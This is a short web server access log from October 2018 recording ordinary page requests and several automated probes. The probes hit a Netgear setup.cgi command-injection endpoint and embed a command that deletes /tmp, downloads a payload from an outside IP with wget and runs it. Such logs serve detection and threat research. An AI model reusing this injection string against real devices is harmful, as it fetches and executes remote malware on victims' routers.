37.210.67.246 - - [02/Oct/2018:19:10:41 +0800] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 969
94.51.54.76 - - [02/Oct/2018:19:18:06 +0800] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 969
212.22.86.211 - - [02/Oct/2018:20:45:42 +0800] "GET / HTTP/1.1" 200 11418
78.108.177.53 - - [02/Oct/2018:21:03:06 +0800] "GET / HTTP/1.0" 200 11398
134.236.242.44 - - [02/Oct/2018:21:13:30 +0800] "GET / HTTP/1.1" 200 11418
200.196.45.206 - - [02/Oct/2018:21:44:57 +0800] "GET / HTTP/1.1" 200 11418
46.174.191.29 - - [02/Oct/2018:22:03:02 +0800] "GET / HTTP/1.0" 200 11398
196.52.43.108 - - [02/Oct/2018:22:36:37 +0800] "GET / HTTP/1.0" 200 11398
5.141.141.147 - - [02/Oct/2018:23:17:12 +0800] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 969
31.163.30.171 - - [02/Oct/2018:23:28:54 +0800] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 969
31.163.30.171 - - [02/Oct/2018:23:28:54 +0800] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://68.183.28.29/juno+-O+/tmp/ng;sh+ng&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 969
201.242.118.88 - - [02/Oct/2018:23:53:44 +0800] "GET / HTTP/1.1" 200 11418
